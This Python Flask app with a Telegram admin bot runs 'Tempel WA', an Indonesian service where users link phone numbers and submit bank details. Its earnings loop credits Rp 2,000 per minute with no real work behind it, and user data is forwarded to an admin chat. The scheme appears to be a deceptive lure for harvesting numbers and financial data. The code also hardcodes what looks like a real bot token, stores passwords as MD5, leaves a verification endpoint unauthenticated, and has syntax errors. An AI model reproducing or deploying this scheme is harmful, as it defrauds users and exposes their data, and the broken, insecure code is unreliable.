# app.py
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import sqlite3
import json
import os
import random
import string
import threading
import time
from datetime import datetime, timedelta
from contextlib import contextmanager
import hashlib
import re

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'tempelwa_secret_key_2024')
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ==================== KONFIGURASI BOT ====================
# Ganti dengan token bot Anda dari @BotFather
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8970711455:AAELoSRs7qnA4GfgGFO1WjXt307QBqqeIwo')
# Ganti dengan chat ID admin dari @userinfobot
ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '8294659241')

# ==================== DATABASE ====================
DB_PATH = 'tempelwa.db'

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        # Users table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password TEXT,
                phone TEXT,
                bank_name TEXT,
                bank_account TEXT,
                bank_holder TEXT,
                referral_code TEXT UNIQUE,
                referred_by TEXT,
                linked_at TIMESTAMP,
                status TEXT DEFAULT 'inactive',
                earnings REAL DEFAULT 0,
                total_earned REAL DEFAULT 0,
                referral_earnings REAL DEFAULT 0,
                last_earning_time TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Numbers table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS numbers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT UNIQUE,
                linked_at TIMESTAMP,
                status TEXT DEFAULT 'active',
                earnings REAL DEFAULT 0,
                total_earned REAL DEFAULT 0,
                last_active TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        
        # Pending verifications
        conn.execute('''
            CREATE TABLE IF NOT EXISTS pending_verifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT UNIQUE,
                code TEXT,
                user_id INTEGER,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        
        # Withdrawals table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS withdrawals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                amount REAL,
                bank_name TEXT,
                bank_account TEXT,
                bank_holder TEXT,
                status TEXT DEFAULT 'pending',
                requested_at TIMESTAMP,
                processed_at TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        
        # History table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                action TEXT,
                amount REAL DEFAULT 0,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        
        # Referrals table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                referred_phone TEXT,
                bonus REAL DEFAULT 0,
                status TEXT DEFAULT 'pending',
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (referrer_id) REFERENCES users(id),
                FOREIGN KEY (referred_id) REFERENCES users(id)
            )
        ''')
        
        conn.commit()
        
        # Create admin user
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE username = 'admin'")
        if not cursor.fetchone():
            referral_code = generate_referral_code()
            cursor.execute(
                """INSERT INTO users 
                   (username, password, phone, bank_name, bank_account, bank_holder, referral_code, status) 
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                ('admin', hashlib.md5('admin123'.encode()).hexdigest(), 
                 'admin', 'BCA', '1234567890', 'Admin Tempel WA', referral_code, 'active')
            )
            conn.commit()

init_db()

def generate_referral_code():
    """Generate unique referral code"""
    while True:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        with get_db() as conn:
            existing = conn.execute("SELECT id FROM users WHERE referral_code = ?", (code,)).fetchone()
            if not existing:
                return code

@contextmanager
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

# ==================== INISIALISASI BOT ====================
bot = telegram.Bot(token=BOT_TOKEN)

# ==================== TELEGRAM BOT HANDLER ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /start"""
    keyboard = [
        [InlineKeyboardButton("📊 Dashboard", callback_data='dashboard')],
        [InlineKeyboardButton("👥 Users", callback_data='users')],
        [InlineKeyboardButton("💰 Withdrawals", callback_data='withdrawals')],
        [InlineKeyboardButton("📈 History", callback_data='history')],
        [InlineKeyboardButton("📱 Referral", callback_data='referral')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🤖 *Tempel WA Admin Bot*\n\n"
        "Selamat datang di panel admin!\n"
        "Gunakan menu di bawah untuk mengelola:\n\n"
        "📊 Dashboard - Statistik umum\n"
        "👥 Users - Kelola user & saldo\n"
        "💰 Withdrawals - Proses WD\n"
        "📈 History - Lihat semua transaksi\n"
        "📱 Referral - Lihat data referral",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def dashboard_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    with get_db() as conn:
        total_users = conn.execute("SELECT COUNT(*) FROM users WHERE status='active'").fetchone()[0]
        total_numbers = conn.execute("SELECT COUNT(*) FROM numbers WHERE status='active'").fetchone()[0]
        total_earnings = conn.execute("SELECT SUM(earnings) FROM numbers").fetchone()[0] or 0
        pending_wd = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE status='pending'").fetchone()[0]
        total_referrals = conn.execute("SELECT COUNT(*) FROM referrals").fetchone()[0]
        pending_verif = conn.execute("SELECT COUNT(*) FROM pending_verifications WHERE status='pending'").fetchone()[0]
        
        text = f"📊 *Dashboard*\n\n"
        text += f"👥 Total User: {total_users}\n"
        text += f"📱 Nomor Terhubung: {total_numbers}\n"
        text += f"💰 Total Saldo: Rp {total_earnings:,.0f}\n"
        text += f"⏳ WD Pending: {pending_wd}\n"
        text += f"🔗 Total Referral: {total_referrals}\n"
        text += f"📨 Verifikasi Pending: {pending_verif}\n\n"
        text += f"🕐 Update: {datetime.now().strftime('%H:%M:%S')}"
        
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔄 Refresh", callback_data='dashboard')
            ]])
        )

async def users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    with get_db() as conn:
        users = conn.execute(
            """SELECT id, username, phone, status, earnings, total_earned, referral_code, 
                      (SELECT COUNT(*) FROM referrals WHERE referrer_id = users.id) as referral_count 
               FROM users ORDER BY created_at DESC"""
        ).fetchall()
        
        if not users:
            await query.edit_message_text("📭 Belum ada user terdaftar.")
            return
        
        text = "👥 *Daftar User*\n\n"
        for user in users[:10]:
            text += f"🆔 {user['username']}\n"
            text += f"📱 {user['phone'] or '-'}\n"
            text += f"💰 Saldo: Rp {user['earnings']:,.0f}\n"
            text += f"📊 Status: {user['status']}\n"
            text += f"🔗 Referral: {user['referral_count']}\n"
            text += f"---\n"
        
        if len(users) > 10:
            text += f"\n... dan {len(users)-10} user lainnya"
        
        keyboard = [
            [InlineKeyboardButton("➕ Tambah Saldo", callback_data='add_balance')],
            [InlineKeyboardButton("🔙 Kembali", callback_data='back')]
        ]
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def withdrawals_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    with get_db() as conn:
        wds = conn.execute(
            """SELECT w.*, u.username FROM withdrawals w 
               JOIN users u ON w.user_id = u.id 
               ORDER BY w.requested_at DESC LIMIT 10"""
        ).fetchall()
        
        if not wds:
            await query.edit_message_text("📭 Tidak ada permintaan WD.")
            return
        
        text = "💰 *Permintaan WD*\n\n"
        for wd in wds:
            status_emoji = "⏳" if wd['status'] == 'pending' else "✅" if wd['status'] == 'approved' else "❌"
            text += f"{status_emoji} ID: {wd['id']}\n"
            text += f"👤 {wd['username']}\n"
            text += f"📱 {wd['phone']}\n"
            text += f"💰 Rp {wd['amount']:,.0f}\n"
            text += f"🏦 {wd['bank_name']} - {wd['bank_account']}\n"
            text += f"📊 {wd['status']}\n"
            text += f"---\n"
        
        keyboard = [
            [InlineKeyboardButton("✅ Proses WD", callback_data='process_wd')],
            [InlineKeyboardButton("🔙 Kembali", callback_data='back')]
        ]
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def referral_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    with get_db() as conn:
        referrals = conn.execute(
            """SELECT r.*, u1.username as referrer, u2.username as referred 
               FROM referrals r
               JOIN users u1 ON r.referrer_id = u1.id
               JOIN users u2 ON r.referred_id = u2.id
               ORDER BY r.timestamp DESC LIMIT 10"""
        ).fetchall()
        
        if not referrals:
            await query.edit_message_text("📭 Belum ada referral.")
            return
        
        text = "🔗 *Data Referral*\n\n"
        for ref in referrals:
            text += f"👤 {ref['referrer']} → {ref['referred']}\n"
            text += f"💰 Bonus: Rp {ref['bonus']:,.0f}\n"
            text += f"📱 {ref['referred_phone']}\n"
            text += f"🕐 {ref['timestamp']}\n"
            text += f"---\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Kembali", callback_data='back')]]
        await query.edit_message_text(
            text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def add_balance_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💳 *Tambah Saldo User*\n\n"
        "Kirim pesan dengan format:\n"
        `/tambahsaldo username jumlah\n\n`
        "Contoh: `/tambahsaldo johndoe 50000`",
        parse_mode='Markdown'
    )

async def process_wd_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💳 *Proses WD*\n\n"
        "Kirim pesan dengan format:\n"
        `/proseswd id_wd\n\n`
        "Contoh: `/proseswd 1`",
        parse_mode='Markdown'
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if not message.text:
        return
    
    text = message.text.strip()
    chat_id = message.chat_id
    
    if str(chat_id) != ADMIN_CHAT_ID:
        await message.reply_text("❌ Anda tidak memiliki akses.")
        return
    
    # ===== COMMAND: /tambahsaldo =====
    if text.startswith('/tambahsaldo'):
        parts = text.split()
        if len(parts) != 3:
            await message.reply_text("❌ Format: /tambahsaldo username jumlah")
            return
        
        username = parts[1]
        try:
            amount = float(parts[2])
        except:
            await message.reply_text("❌ Jumlah harus angka")
            return
        
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
            if not user:
                await message.reply_text(f"❌ User {username} tidak ditemukan")
                return
            
            conn.execute(
                "UPDATE users SET earnings = earnings + ? WHERE username = ?",
                (amount, username)
            )
            conn.commit()
            
            conn.execute(
                "INSERT INTO history (user_id, phone, action, amount) VALUES (?, ?, ?, ?)",
                (user['id'], user['phone'] or 'admin', 'add_balance', amount)
            )
            conn.commit()
        
        await message.reply_text(
            f"✅ Berhasil tambah saldo\n"
            f"👤 {username}\n"
            f"💰 Rp {amount:,.0f}"
        )
        return
    
    # ===== COMMAND: /proseswd =====
    if text.startswith('/proseswd'):
        parts = text.split()
        if len(parts) != 2:
            await message.reply_text("❌ Format: /proseswd id_wd")
            return
        
        wd_id = parts[1]
        
        with get_db() as conn:
            wd = conn.execute("SELECT * FROM withdrawals WHERE id = ? AND status = 'pending'", (wd_id,)).fetchone()
            if not wd:
                await message.reply_text(f"❌ WD ID {wd_id} tidak ditemukan atau sudah diproses")
                return
            
            conn.execute(
                "UPDATE withdrawals SET status = 'approved', processed_at = ? WHERE id = ?",
                (datetime.now().isoformat(), wd_id)
            )
            
            conn.execute(
                "INSERT INTO history (user_id, phone, action, amount) VALUES (?, ?, ?, ?)",
                (wd['user_id'], wd['phone'], 'withdraw_approved', wd['amount'])
            )
            conn.commit()
        
        await message.reply_text(
            f"✅ WD ID {wd_id} disetujui!\n"
            f"📱 {wd['phone']}\n"
            f"💰 Rp {wd['amount']:,.0f}"
        )
        return
    
    # ===== COMMAND: /putus =====
    if text.startswith('/putus'):
        parts = text.split()
        if len(parts) != 2:
            await message.reply_text("❌ Format: /putus username")
            return
        
        username = parts[1]
        
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
            if not user:
                await message.reply_text(f"❌ User {username} tidak ditemukan")
                return
            
            numbers = conn.execute("SELECT phone FROM numbers WHERE user_id = ? AND status='active'", (user['id'],)).fetchall()
            
            conn.execute("UPDATE users SET status = 'inactive' WHERE username = ?", (username,))
            conn.execute("UPDATE numbers SET status = 'inactive' WHERE user_id = ?", (user['id'],))
            conn.commit()
            
            for num in numbers:
                socketio.emit('user_disconnected', {'phone': num['phone']})
        
        await message.reply_text(f"✅ User {username} telah diputuskan")
        return
    
    # ===== COMMAND: /hubungkan =====
    if text.startswith('/hubungkan'):
        parts = text.split()
        if len(parts) != 3:
            await message.reply_text("❌ Format: /hubungkan phone code")
            return
        
        phone = parts[1]
        code = parts[2].upper()
        
        with get_db() as conn:
            pending = conn.execute(
                "SELECT * FROM pending_verifications WHERE phone = ? AND code = ? AND status = 'pending'",
                (phone, code)
            ).fetchone()
            
            if not pending:
                await message.reply_text(f"❌ Verifikasi tidak ditemukan untuk {phone}")
                return
            
            conn.execute(
                "UPDATE numbers SET status = 'active', linked_at = ? WHERE phone = ?",
                (datetime.now().isoformat(), phone)
            )
            conn.execute(
                "UPDATE pending_verifications SET status = 'verified' WHERE phone = ?",
                (phone,)
            )
            conn.execute(
                "UPDATE users SET status = 'active' WHERE id = ?",
                (pending['user_id'],)
            )
            conn.commit()
            
            socketio.emit('number_verified', {'phone': phone})
            socketio.emit('verification_success', {'phone': phone})
            
            await message.reply_text(
                f"✅ Nomor {phone} berhasil terhubung!\n"
                f"💰 Mulai menghasilkan Rp 2.000/menit"
            )
        return
    
    # ===== COMMAND: /status =====
    if text.startswith('/status'):
        with get_db() as conn:
            total_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            active_users = conn.execute("SELECT COUNT(*) FROM users WHERE status='active'").fetchone()[0]
            total_numbers = conn.execute("SELECT COUNT(*) FROM numbers").fetchone()[0]
            active_numbers = conn.execute("SELECT COUNT(*) FROM numbers WHERE status='active'").fetchone()[0]
            total_earnings = conn.execute("SELECT SUM(earnings) FROM numbers").fetchone()[0] or 0
            pending_wd = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE status='pending'").fetchone()[0]
            
            text = f"📊 *Status Sistem*\n\n"
            text += f"👥 Total User: {total_users}\n"
            text += f"✅ Active: {active_users}\n"
            text += f"📱 Total Nomor: {total_numbers}\n"
            text += f"📱 Active: {active_numbers}\n"
            text += f"💰 Total Saldo: Rp {total_earnings:,.0f}\n"
            text += f"⏳ WD Pending: {pending_wd}"
            
            await message.reply_text(text, parse_mode='Markdown')
        return
    
    await message.reply_text(
        "📖 *Perintah Admin*\n\n"
        "/tambahsaldo username jumlah - Tambah saldo user\n"
        "/proseswd id - Setujui WD\n"
        "/putus username - Putuskan user\n"
        "/hubungkan phone code - Verifikasi manual\n"
        "/status - Lihat status\n\n"
        "Gunakan menu inline untuk navigasi.",
        parse_mode='Markdown'
    )

# ==================== EARNINGS LOOP ====================

def earnings_loop():
    while True:
        time.sleep(60)
        try:
            with get_db() as conn:
                numbers = conn.execute(
                    "SELECT id, user_id, phone, earnings FROM numbers WHERE status = 'active'"
                ).fetchall()
                
                for number in numbers:
                    new_earnings = number['earnings'] + 2000
                    conn.execute(
                        "UPDATE numbers SET earnings = ?, total_earned = total_earned + 2000, last_active = ? WHERE id = ?",
                        (new_earnings, datetime.now().isoformat(), number['id'])
                    )
                    
                    conn.execute(
                        "UPDATE users SET earnings = earnings + 2000, total_earned = total_earned + 2000 WHERE id = ?",
                        (number['user_id'],)
                    )
                    
                    socketio.emit('earnings_update', {
                        'phone': number['phone'],
                        'earnings': new_earnings
                    })
                conn.commit()
        except Exception as e:
            print(f"Earnings loop error: {e}")

# ==================== FLASK ROUTES ====================

@app.route('/')
def home():
    if 'user_id' in session:
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        phone = data.get('phone')
        bank_name = data.get('bank_name')
        bank_account = data.get('bank_account')
        bank_holder = data.get('bank_holder')
        referral_code = data.get('referral_code', '').upper()
        
        if not all([username, password, phone, bank_name, bank_account, bank_holder]):
            return jsonify({'success': False, 'message': 'Semua field harus diisi'}), 400
        
        with get_db() as conn:
            existing = conn.execute("SELECT id FROM users WHERE username = ?", (username,)).fetchone()
            if existing:
                return jsonify({'success': False, 'message': 'Username sudah digunakan'}), 400
            
            existing = conn.execute("SELECT id FROM users WHERE phone = ?", (phone,)).fetchone()
            if existing:
                return jsonify({'success': False, 'message': 'Nomor sudah terdaftar'}), 400
            
            referrer_id = None
            if referral_code:
                referrer = conn.execute("SELECT id FROM users WHERE referral_code = ?", (referral_code,)).fetchone()
                if referrer:
                    referrer_id = referrer['id']
            
            new_ref_code = generate_referral_code()
            hashed_password = hashlib.md5(password.encode()).hexdigest()
            
            conn.execute(
                """INSERT INTO users 
                   (username, password, phone, bank_name, bank_account, bank_holder, referral_code, referred_by, status) 
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (username, hashed_password, phone, bank_name, bank_account, bank_holder, 
                 new_ref_code, referrer_id, 'active')
            )
            user_id = conn.lastrowid
            
            if referrer_id:
                bonus = 1000
                conn.execute(
                    "UPDATE users SET earnings = earnings + ?, referral_earnings = referral_earnings + ? WHERE id = ?",
                    (bonus, bonus, referrer_id)
                )
                conn.execute(
                    "INSERT INTO referrals (referrer_id, referred_id, referred_phone, bonus, status) VALUES (?, ?, ?, ?, ?)",
                    (referrer_id, user_id, phone, bonus, 'approved')
                )
                conn.execute(
                    "INSERT INTO history (user_id, phone, action, amount) VALUES (?, ?, ?, ?)",
                    (referrer_id, phone, 'referral_bonus', bonus)
                )
                conn.commit()
                
                try:
                    bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=f"🔗 *Referral Baru!*\n\n"
                             f"👤 {username} mendaftar dengan referral\n"
                             f"🔗 Kode: {referral_code}\n"
                             f"💰 Bonus: Rp {bonus:,.0f}",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            
            conn.commit()
            
            try:
                bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"📱 *User Baru Terdaftar!*\n\n"
                         f"👤 Username: {username}\n"
                         f"📱 Phone: {phone}\n"
                         f"🏦 Bank: {bank_name} - {bank_account}\n"
                         f"👤 Nama: {bank_holder}\n"
                         f"🔗 Kode Referral: {new_ref_code}\n"
                         f"🕐 Waktu: {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode='Markdown'
                )
            except:
                pass
            
            return jsonify({
                'success': True,
                'message': 'Registrasi berhasil!',
                'referral_code': new_ref_code
            })
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        hashed = hashlib.md5(password.encode()).hexdigest()
        
        with get_db() as conn:
            user = conn.execute(
                "SELECT * FROM users WHERE username = ? AND password = ?",
                (username, hashed)
            ).fetchone()
            
            if user:
                session['user_id'] = user['id']
                session['username'] = user['username']
                return jsonify({'success': True, 'redirect': '/dashboard'})
            return jsonify({'success': False, 'message': 'Username atau password salah'})
    
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/login')
    return render_template('dashboard.html')

@app.route('/api/user')
def get_user():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],)).fetchone()
        return jsonify(dict(user))

@app.route('/api/numbers')
def get_numbers():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    with get_db() as conn:
        numbers = conn.execute(
            "SELECT * FROM numbers WHERE user_id = ? ORDER BY linked_at DESC",
            (session['user_id'],)
        ).fetchall()
        return jsonify([dict(n) for n in numbers])

@app.route('/api/history')
def get_history():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    with get_db() as conn:
        history = conn.execute(
            "SELECT * FROM history WHERE user_id = ? ORDER BY timestamp DESC LIMIT 50",
            (session['user_id'],)
        ).fetchall()
        return jsonify([dict(h) for h in history])

@app.route('/api/withdrawals')
def get_withdrawals():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    with get_db() as conn:
        wds = conn.execute(
            "SELECT * FROM withdrawals WHERE user_id = ? ORDER BY requested_at DESC",
            (session['user_id'],)
        ).fetchall()
        return jsonify([dict(w) for w in wds])

@app.route('/api/referral')
def get_referral():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    with get_db() as conn:
        user = conn.execute("SELECT referral_code FROM users WHERE id = ?", (session['user_id'],)).fetchone()
        referrals = conn.execute(
            """SELECT u.username, r.timestamp, r.bonus, r.referred_phone 
               FROM referrals r 
               JOIN users u ON r.referred_id = u.id 
               WHERE r.referrer_id = ? 
               ORDER BY r.timestamp DESC""",
            (session['user_id'],)
        ).fetchall()
        total_bonus = conn.execute(
            "SELECT SUM(bonus) as total FROM referrals WHERE referrer_id = ?",
            (session['user_id'],)
        ).fetchone()['total'] or 0
        
        return jsonify({
            'referral_code': user['referral_code'],
            'referrals': [dict(r) for r in referrals],
            'total_bonus': total_bonus
        })

@app.route('/api/connect', methods=['POST'])
def connect_number():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'error': 'No phone number'}), 400
    
    phone = re.sub(r'\D', '', phone)
    if len(phone) < 8:
        return jsonify({'error': 'Invalid phone number'}), 400
    
    with get_db() as conn:
        existing = conn.execute("SELECT * FROM numbers WHERE phone = ? AND status = 'active'", (phone,)).fetchone()
        if existing:
            return jsonify({'error': 'Nomor sudah terhubung'}), 400
        
        pending = conn.execute("SELECT * FROM pending_verifications WHERE phone = ? AND status = 'pending'", (phone,)).fetchone()
        if pending:
            return jsonify({'error': 'Nomor sedang dalam proses verifikasi'}), 400
        
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        
        conn.execute(
            "INSERT INTO pending_verifications (phone, code, user_id, status) VALUES (?, ?, ?, ?)",
            (phone, code, session['user_id'], 'pending')
        )
        
        conn.execute(
            "INSERT OR REPLACE INTO numbers (user_id, phone, linked_at, status) VALUES (?, ?, ?, ?)",
            (session['user_id'], phone, datetime.now().isoformat(), 'pending')
        )
        conn.commit()
        
        try:
            bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"📱 *Verifikasi Nomor Baru*\n\n"
                     f"👤 User: {session['username']}\n"
                     f"📱 Nomor: {phone}\n"
                     f"🔑 Kode: {code}\n"
                     f"🕐 Waktu: {datetime.now().strftime('%H:%M:%S')}\n\n"
                     f"Gunakan: /hubungkan {phone} {code}",
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Error sending to bot: {e}")
        
        return jsonify({
            'success': True,
            'message': 'Kode verifikasi terkirim ke admin',
            'code': code
        })

@app.route('/api/verify', methods=['POST'])
def verify_number():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({'error': 'Missing data'}), 400
    
    with get_db() as conn:
        pending = conn.execute(
            "SELECT * FROM pending_verifications WHERE phone = ? AND code = ? AND status = 'pending'",
            (phone, code.upper())
        ).fetchone()
        
        if not pending:
            return jsonify({'error': 'Kode tidak valid'}), 400
        
        conn.execute(
            "UPDATE numbers SET status = 'active', linked_at = ? WHERE phone = ?",
            (datetime.now().isoformat(), phone)
        )
        conn.execute(
            "UPDATE pending_verifications SET status = 'verified' WHERE phone = ?",
            (phone,)
        )
        conn.execute(
            "UPDATE users SET status = 'active' WHERE id = ?",
            (pending['user_id'],)
        )
        conn.commit()
        
        try:
            bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"✅ *Nomor Terverifikasi!*\n\n"
                     f"📱 {phone}\n"
                     f"👤 User: {session.get('username', 'unknown')}\n"
                     f"💰 Mulai menghasilkan Rp 2.000/menit",
                parse_mode='Markdown'
            )
        except:
            pass
        
        socketio.emit('number_verified', {'phone': phone})
        
        return jsonify({'success': True, 'message': 'Nomor berhasil terhubung!'})

@app.route('/api/withdraw', methods=['POST'])
def request_withdraw():
    if 'user_id' not in session:
        return jsonify({'error': 'Not logged in'}), 401
    
    data = request.json
    amount = data.get('amount')
    phone = data.get('phone')
    
    if not amount or not phone:
        return jsonify({'error': 'Missing data'}), 400
    
    try:
        amount = float(amount)
    except:
        return jsonify({'error': 'Invalid amount'}), 400
    
    if amount < 50000:
        return jsonify({'error': 'Minimal WD Rp 50.000'}), 400
    
    with get_db() as conn:
        number = conn.execute(
            "SELECT * FROM numbers WHERE phone = ? AND user_id = ? AND status = 'active'",
            (phone, session['user_id'])
        ).fetchone()
        
        if not number:
            return jsonify({'error': 'Nomor tidak ditemukan'}), 400
        
        if number['earnings'] < amount:
            return jsonify({'error': 'Saldo tidak cukup'}), 400
        
        user = conn.execute(
            "SELECT bank_name, bank_account, bank_holder, username FROM users WHERE id = ?",
            (session['user_id'],)
        ).fetchone()
        
        conn.execute(
            """INSERT INTO withdrawals 
               (user_id, phone, amount, bank_name, bank_account, bank_holder, requested_at) 
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (session['user_id'], phone, amount, user['bank_name'], 
             user['bank_account'], user['bank_holder'], datetime.now().isoformat())
        )
        
        conn.execute(
            "UPDATE numbers SET earnings = earnings - ? WHERE phone = ? AND user_id = ?",
            (amount, phone, session['user_id'])
        )
        conn.execute(
            "UPDATE users SET earnings = earnings - ? WHERE id = ?",
            (amount, session['user_id'])
        )
        conn.execute(
            "INSERT INTO history (user_id, phone, action, amount) VALUES (?, ?, ?, ?)",
            (session['user_id'], phone, 'withdraw_request', amount)
        )
        conn.commit()
        
        try:
            bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"💰 *Permintaan WD*\n\n"
                     f"👤 User: {user['username']}\n"
                     f"📱 {phone}\n"
                     f"💰 Rp {amount:,.0f}\n"
                     f"🏦 {user['bank_name']} - {user['bank_account']}\n"
                     f"👤 A/n: {user['bank_holder']}\n"
                     f"🕐 {datetime.now().strftime('%H:%M:%S')}\n\n"
                     f"Gunakan /proseswd untuk setujui",
                parse_mode='Markdown'
            )
        except:
            pass
        
        return jsonify({'success': True})

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

# ==================== MAIN ====================

if __name__ == '__main__':
    # Start earnings loop
    earnings_thread = threading.Thread(target=earnings_loop, daemon=True)
    earnings_thread.start()
    
    # Get port from environment variable (for deployment)
    port = int(os.environ.get('PORT', 5000))
    
    print("=" * 60)
    print("🚀 TEMPEL WA SERVER STARTED!")
    print("=" * 60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:20]}...")
    print(f"👤 Admin ID: {ADMIN_CHAT_ID}")
    print(f"📱 Website: http://localhost:{port}")
    print("=" * 60)
    print("📋 FITUR LENGKAP:")
    print("  ✅ Registrasi dengan data bank")
    print("  ✅ Login sistem")
    print("  ✅ Hubungkan multiple nomor")
    print("  ✅ Verifikasi via admin bot")
    print("  ✅ Saldo otomatis Rp 2.000/menit")
    print("  ✅ WD minimal Rp 50.000")
    print("  ✅ Referral bonus Rp 1.000")
    print("  ✅ History aktivitas")
    print("  ✅ Real-time updates via WebSocket")
    print("  ✅ Bot Telegram admin terintegrasi")
    print("=" * 60)
    print("\n📌 Cara Verifikasi Nomor:")
    print("  1. User klik 'Hubungkan' di website")
    print("  2. Bot menerima notifikasi dengan kode")
    print("  3. Admin kirim: /hubungkan 08123456789 AB12CD34")
    print("  4. Website otomatis terhubung!")
    print("=" * 60)
    
    socketio.run(app, debug=False, host='0.0.0.0', port=port)